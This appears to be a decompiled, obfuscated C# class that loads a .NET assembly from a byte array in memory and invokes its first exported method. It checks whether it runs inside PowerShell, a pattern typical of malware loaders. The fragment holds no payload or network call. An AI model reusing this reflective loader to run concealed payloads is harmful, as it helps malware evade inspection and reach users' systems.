using System;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

// Token: 0x0200000D RID: 13
internal class Class5
{
	// Token: 0x0600003B RID: 59 RVA: 0x000023B7 File Offset: 0x000005B7
	internal void method_0(byte[] byte_0, byte[] byte_1)
	{
		this.method_1(byte_0, byte_1);
	}

	// Token: 0x0600003C RID: 60 RVA: 0x00008774 File Offset: 0x00006974
	private void method_1(byte[] byte_0, byte[] byte_1)
	{
		Assembly assembly = null;
		if (this.d())
		{
			try
			{
				assembly = this.method_2(byte_1);
			}
			catch
			{
			}
		}
		if (assembly == null)
		{
			assembly = Thread.GetDomain().Load(byte_1);
		}
		assembly.GetExportedTypes()[0].GetMethods()[0].Invoke(null, new object[]
		{
			byte_0
		});
	}

	// Token: 0x0600003D RID: 61 RVA: 0x000087E0 File Offset: 0x000069E0
	private Assembly method_2(byte[] byte_0)
	{
		Class5.a a = new Class5.a();
		Assembly assembly = Assembly.Load(byte_0);
		a.field_a = assembly.FullName;
		Assembly assembly2 = AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault(new Func<Assembly, bool>(a.method_a));
		if (assembly2 != null)
		{
			return assembly2;
		}
		return assembly;
	}

	// Token: 0x0600003E RID: 62 RVA: 0x00008830 File Offset: 0x00006A30
	private bool d()
	{
		bool result;
		try
		{
			if (!Class4.h().ToLower().Contains("powershell.exe"))
			{
				if (!(AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault(new Func<Assembly, bool>(Class5.__c.__c_0.method_0)) != null))
				{
					return false;
				}
				result = true;
			}
			else
			{
				result = true;
			}
		}
		catch
		{
			return false;
		}
		return result;
	}

	// Token: 0x06000040 RID: 64 RVA: 0x00002308 File Offset: 0x00000508
	// Note: this type is marked as 'beforefieldinit'.
	static Class5()
	{
		Class16.kLjw4iIsCLsZtxc4lksN0j();
	}

	// Token: 0x06000041 RID: 65 RVA: 0x000023C1 File Offset: 0x000005C1
	internal static bool smethod_0()
	{
		return Class5.object_0 == null;
	}

	// Token: 0x04000023 RID: 35
	internal static object object_0;

	// Compiler-generated singleton class (originally <>c)
	[CompilerGenerated]
	private sealed class __c
	{
		public static readonly Class5.__c __c_0 = new Class5.__c();

		internal bool method_0(Assembly assembly_0)
		{
			return assembly_0.FullName.Contains("System.Management.Automation");
		}
	}

	// Token: 0x0200000F RID: 15
	[CompilerGenerated]
	private sealed class a
	{
		// Token: 0x06000047 RID: 71 RVA: 0x000023FD File Offset: 0x000005FD
		internal bool method_a(Assembly asm)
		{
			return asm.FullName == this.field_a;
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00002308 File Offset: 0x00000508
		// Note: this type is marked as 'beforefieldinit'.
		static a()
		{
			Class16.kLjw4iIsCLsZtxc4lksN0j();
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00002410 File Offset: 0x00000610
		internal static bool smethod_0()
		{
			return Class5.a.a_0 == null;
		}

		// Token: 0x04000027 RID: 39
		public string field_a;

		// Token: 0x04000028 RID: 40
		private static Class5.a a_0;
	}
}
